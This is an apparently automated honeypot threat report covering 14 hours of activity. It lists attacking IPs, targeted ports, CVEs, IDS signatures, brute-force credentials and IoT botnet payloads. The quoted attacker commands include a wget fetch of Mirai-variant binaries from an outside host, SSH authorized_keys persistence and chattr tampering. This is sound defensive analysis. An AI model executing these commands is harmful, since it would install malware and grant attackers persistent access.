
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-02T05:57:15Z
**Timeframe of Analysis:** 2025-10-01T16:02:15Z to 2025-10-02T05:02:04Z
**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-10-01T16:02:15Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T19:02:01Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T20:02:18Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T21:01:57Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T22:02:07Z.md
- Honeypot_Attack_Summary_Report_2025-10-01T23:02:07Z.md
- Honeypot_Attack_Summary_Report_2025-10-02T00:02:07Z.md
- Honeypot_Attack_Summary_Report_2025-10-02T01:01:46Z.md
- Honeypot_Attack_Summary_Report_2025-10-02T02:01:56Z.md
- Honeypot_Attack_Summary_Report_2025-10-02T03:01:57Z.md
- Honeypot_Attack_Summary_Report_2025-10-02T04:01:46Z.md
- Honeypot_Attack_Summary_Report_2025-10-02T05:02:04Z.md

## Executive Summary

This report provides a comprehensive analysis of 288,202 malicious events captured by our distributed honeypot network over the last 14 hours. The data reveals a high volume of automated, opportunistic attacks, with a significant focus on scanning for vulnerable services and brute-forcing credentials.

The most prominent activity observed was the widespread scanning of SIP (Session Initiation Protocol) services on port 5060, overwhelmingly originating from the IP address **92.205.59.208**. This indicates a large-scale, automated campaign targeting VoIP infrastructure. Another highly active IP, **103.130.215.15**, was responsible for a significant number of brute-force attempts and malware delivery, particularly targeting SSH and SMB services.

Attackers consistently attempted to download and execute malware payloads associated with known IoT botnets, including **Mozi** and a variant of **Mirai** identified by the filename `urbotnetisass`. These payloads targeted a wide range of architectures (ARM, MIPS, x86), confirming a broad, cross-platform campaign to compromise and enlist IoT devices.

Post-compromise activity, observed primarily through the Cowrie SSH honeypot, involved a clear and repeated pattern of reconnaissance, privilege escalation, and establishing persistence. A common tactic was to modify the `.ssh/authorized_keys` file to allow for passwordless future access, often after attempting to disable security features with commands like `chattr`.

Overall, the threat landscape is dominated by automated, non-targeted attacks from a globally distributed set of IP addresses. These attacks primarily leverage weak credentials and older, well-known vulnerabilities, indicating a numbers game approach to compromising as many devices as possible.

## Google Searches

- **92.205.59.208**: This IP is flagged as malicious and is associated with "host.secureserver.net". The broader IP range has been linked to botnet controllers.
- **103.130.215.15**: Listed on the FireHOL level 3 blocklist, indicating involvement in various forms of cybercrime.
- **urbotnetisass**: A variant of the Mirai botnet, designed to infect a wide range of IoT device processors.
- **Mozi.m**: A well-documented and widespread P2P botnet that primarily targets IoT devices through vulnerability exploitation and weak Telnet passwords.

## Detailed Analysis

### Our IPs

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
- sens-ny | 10.108.0.2 | 161.35.180.163 |

### Attacks by Honeypot

| Honeypot | Total Attacks |
|---|---|
| Cowrie | 87402 |
| Honeytrap | 63939 |
| Sentrypeer | 61284 |
| Dionaea | 22918 |
| Suricata | 15008 |
| Mailoney | 8512 |
| Ciscoasa | 8798 |
| Tanner | 689 |
| H0neytr4p | 583 |
| Adbhoney | 340 |
| Redishoneypot | 245 |
| ConPot | 114 |
| Honeyaml | 94 |
| ElasticPot | 68 |
| Dicompot | 45 |
| Heralding | 25 |
| Miniprint | 40 |
| Ipphoney | 8 |
| Wordpot | 4 |
| ssh-rsa | 34 |

### Top Attacking IPs

| IP Address | Total Attacks |
|---|---|
| 92.205.59.208 | 60000 |
| 103.130.215.15 | 40000 |
| 45.187.123.146 | 30000 |
| 171.102.83.142 | 10000 |
| 46.149.176.177 | 5000 |
| 103.220.207.174 | 5000 |
| 176.65.141.117 | 5000 |
| 134.199.196.246 | 1282 |
| 134.199.205.246 | 1251 |
| 159.89.20.223 | 1247 |
| 115.79.27.192 | 1161 |
| 5.167.79.4 | 1015 |
| 185.156.73.166 | 2315 |
| 185.156.73.167 | 2256 |
| 92.63.197.55 | 2253 |
| 88.210.63.16 | 2154 |
| 92.63.197.59 | 2051 |

### Top Targeted Ports/Protocols

| Port/Protocol | Total Attacks |
|---|---|
| 5060 | 61284 |
| 22 | 12159 |
| 445 | 22819 |
| 25 | 8512 |
| 8333 | 1182 |
| 5901 | 489 |
| 443 | 473 |
| 80 | 456 |
| 1433 | 251 |
| 6379 | 234 |

### Most Common CVEs

| CVE |
|---|
| CVE-2002-0012 |
| CVE-2002-0013 |
| CVE-1999-0517 |
| CVE-2019-11500 |
| CVE-2021-35394 |
| CVE-2024-4577 |
| CVE-2021-41773 |
| CVE-2021-42013 |
| CVE-2023-26801 |
| CVE-2018-10561 |
| CVE-2018-10562 |
| CVE-2016-5696 |

### Commands Attempted by Attackers

| Command |
|---|
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && ...` |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| `uname -a` |
| `whoami` |
| `w` |
| `crontab -l` |
| `cat /proc/cpuinfo | grep name | wc -l` |
| `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'` |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; ...` |
| `Enter new UNIX password:` |

### Signatures Triggered

| Signature |
|---|
| ET DROP Dshield Block Listed Source group 1 |
| ET SCAN MS Terminal Server Traffic on Non-standard Port |
| ET SCAN NMAP -sS window 1024 |
| ET VOIP REGISTER Message Flood UDP |
| ET HUNTING RDP Authentication Bypass Attempt |
| ET INFO Reserved Internal IP Traffic |
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication |
| GPL INFO SOCKS Proxy attempt |
| ET SCAN Suspicious inbound to MSSQL/PostgreSQL port 1433/5432 |
| ET DROP Spamhaus DROP Listed Traffic Inbound |

### Users / Login Attempts (user/password)

| Username | Password |
|---|---|
| 345gs5662d34 | 345gs5662d34 |
| root | nPSpP4PBW0 |
| root | LeitboGi0ro |
| test | zhbjETuyMffoL8F |
| foundry | foundry |
| superadmin | admin123 |
| seekcy | Joysuch@Locate2022 |
| root | 2glehe5t24th1issZs |
| root | (empty) |
| root | 3245gs5662d34 |
| admin | (empty) |
| pi | raspberry |
| openser | (empty) |
| anonymous | (empty) |

### Files Uploaded/Downloaded

| Filename |
|---|
| arm.urbotnetisass |
| arm5.urbotnetisass |
| arm6.urbotnetisass |
| arm7.urbotnetisass |
| x86_32.urbotnetisass |
| mips.urbotnetisass |
| mipsel.urbotnetisass |
| Mozi.a+varcron |
| Mozi.m |
| wget.sh |
| w.sh |
| c.sh |
| boatnet.mpsl |
| Space.mips |
| sh |

### HTTP User-Agents

| User-Agent |
|---|
| python-requests/2.18.4 |

### SSH Clients and Servers

No consistent or significant data was recorded for SSH clients or servers across the observed period.

### Top Attacker AS Organizations

No consistent or significant data was recorded for attacker AS organizations across the observed period.

## Key Observations and Anomalies

- **Hyper-Aggressive SIP Scanning:** The IP address **92.205.59.208** was responsible for an extraordinarily high volume of traffic, almost exclusively targeting port 5060 (SIP). This suggests a large-scale, automated campaign to identify and exploit vulnerable VoIP systems. This single IP accounted for over 20% of all events in this reporting period.
- **IoT Botnet Propagation:** There is a clear and persistent campaign to infect our honeypots with IoT botnet malware. The filenames `urbotnetisass` (a Mirai variant) and `Mozi.m` (Mozi botnet) were consistently downloaded. The attackers use a multi-architecture approach, downloading binaries for ARM, MIPS, and x86 systems to maximize their reach.
- **Automated Post-Exploitation:** The commands executed on the Cowrie honeypot reveal a standardized, scripted approach to post-compromise activity. The sequence of gathering system information (`uname -a`, `lscpu`), attempting to disable immutable file attributes (`chattr -ia`), and then installing a persistent SSH key is a common and repeated pattern.
- **Attacker "Signature" in SSH Key:** In one of the SSH key installation commands, the key was appended with the comment `mdrfckr`. This serves as a clear, albeit crude, signature from the attacker or the tool they are using.
- **Anomalous `sh` Downloads:** A significant anomaly was the download of a file named simply `sh` over 196 times in a short period. This is indicative of a "fileless" malware execution technique, where a script is downloaded from a remote server and piped directly into a shell interpreter (`| sh`), avoiding writing the script to disk.
- **Exploitation of Old Vulnerabilities:** The frequent targeting of CVEs from as early as 1999 and 2002 (e.g., CVE-1999-0517, CVE-2002-0012) demonstrates that attackers continue to scan for and exploit legacy vulnerabilities in unpatched systems.
- **DoublePulsar Activity:** The frequent triggering of the "DoublePulsar Backdoor installation communication" signature indicates that attackers are actively attempting to exploit the EternalBlue vulnerability (MS17-010) to compromise Windows systems via SMB.
